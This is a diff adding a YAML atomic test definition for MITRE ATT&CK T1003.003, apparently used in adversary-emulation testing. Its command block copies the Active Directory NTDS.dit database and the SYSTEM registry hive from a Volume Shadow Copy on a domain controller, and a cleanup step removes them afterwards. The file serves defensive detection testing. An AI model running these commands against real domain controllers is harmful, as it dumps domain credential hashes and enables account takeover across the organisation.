@@ -1,0 +1,40 @@
+- id: 41ee3460-cb8d-51bb-83f5-3cb0ff7706b1
+  name: Soumaia ART Tests - Copy NTDS.dit from Volume Shadow Copy
+  description: 'This test is intended to be run on a domain Controller.
+
+
+    The Active Directory database NTDS.dit may be dumped by copying it from a Volume Shadow Copy.
+
+
+    This test requires steps taken in the test "Create Volume Shadow Copy with vssadmin".
+
+    A successful test also requires the export of the SYSTEM Registry hive.
+
+    This test must be executed on a Windows Domain Controller. (requires elevation)'
+  tactic: credential-access
+  technique:
+    attack_id: T1003.003
+    name: 'OS Credential Dumping: NTDS'
+  platforms:
+    windows:
+      cmd:
+        command: |-
+          cmd /c "reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\ProductOptions  /v ProductType | findstr LanmanNT"
+          if not "%ERRORLEVEL%"=="0" (
+              cmd /c "echo Sorry, Promoting this machine to a Domain Controller must be done manually"
+          )
+          cmd /c "if not exist \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1 (exit /b 1)"
+          if not "%ERRORLEVEL%"=="0" (
+              cmd /c "echo Run ""Invoke-AtomicTest T1003.003 -TestName 'Create Volume Shadow Copy with vssadmin'"" to fulfill this requirement"
+          )
+          cmd /c "if not exist C:\Windows\Temp (exit /b 1)"
+          if not "%ERRORLEVEL%"=="0" (
+              cmd /c "mkdir C:\Windows\Temp"
+          )
+          copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\Windows\Temp\ntds.dit
+          copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\Windows\Temp\VSC_SYSTEM_HIVE
+          reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM_HIVE
+        cleanup: |-
+          del "C:\Windows\Temp\ntds.dit"        >nul 2> nul
+          del "C:\Windows\Temp\VSC_SYSTEM_HIVE" >nul 2> nul
+          del "C:\Windows\Temp\SYSTEM_HIVE"     >nul 2> nul
